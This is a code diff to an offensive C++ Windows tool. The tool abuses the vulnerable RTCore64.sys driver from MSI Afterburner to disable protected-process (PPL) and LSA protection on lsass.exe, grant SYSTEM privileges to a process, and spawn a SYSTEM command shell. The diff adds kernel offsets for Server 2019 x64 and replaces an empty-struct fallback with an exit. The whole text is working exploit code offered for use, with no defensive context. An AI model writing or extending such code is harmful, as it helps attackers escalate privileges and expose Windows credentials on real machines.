@@ -396,9 +396,13 @@ struct Offsets getVersionOffsets() {
         return Offsets{ 0x02e8, 0x02f0, 0x0360, 0x06f8 };
     case 2004:
         return Offsets{ 0x0440, 0x0448, 0x04b8, 0x0878 };
+    case 1809:
+        // Offsets for Server 2019 x64
+        return Offsets{ 0x02e0, 0x02e8, 0x0358, 0x06c8 };
     default:
         wprintf(L"[!] Version Offsets Not Found!\n");
-        return Offsets {};
+        // Previously this returned an empty struct, which could (would?) cause the OS to crash and burn. Hopefully just an exit is ok.
+        exit(-1);
     }
 
 }
@@ -416,7 +420,6 @@ int wmain(int argc, wchar_t* argv[]) {
         return 0;
     }
 
-    Offsets offsets = getVersionOffsets();
     const auto svcName = L"RTCore64";
     const auto svcDesc = L"Micro-Star MSI Afterburner";
     const wchar_t driverName[] = L"\\RTCore64.sys";
@@ -427,15 +430,19 @@ int wmain(int argc, wchar_t* argv[]) {
     
     
     if (wcscmp(argv[1] + 1, L"disablePPL") == 0 && argc == 3) {
+        Offsets offsets = getVersionOffsets();
         auto PID = _wtoi(argv[2]);
         disableProtectedProcesses(PID, offsets);
     } else if (wcscmp(argv[1] + 1, L"disableLSAProtection") == 0) {
+        Offsets offsets = getVersionOffsets();
         auto lsassPID = processPIDByName(L"lsass.exe");
         disableProtectedProcesses(lsassPID, offsets);
     } else if (wcscmp(argv[1] + 1, L"makeSYSTEM") == 0 && argc == 3) {
+        Offsets offsets = getVersionOffsets();
         auto PID = _wtoi(argv[2]);
         makeSYSTEM(PID, offsets);
     } else if (wcscmp(argv[1] + 1, L"makeSYSTEMcmd") == 0) {
+        Offsets offsets = getVersionOffsets();
         makeSYSTEM(GetCurrentProcessId(), offsets);
         spawnCmd();
     } else if (wcscmp(argv[1] + 1, L"installDriver") == 0) {
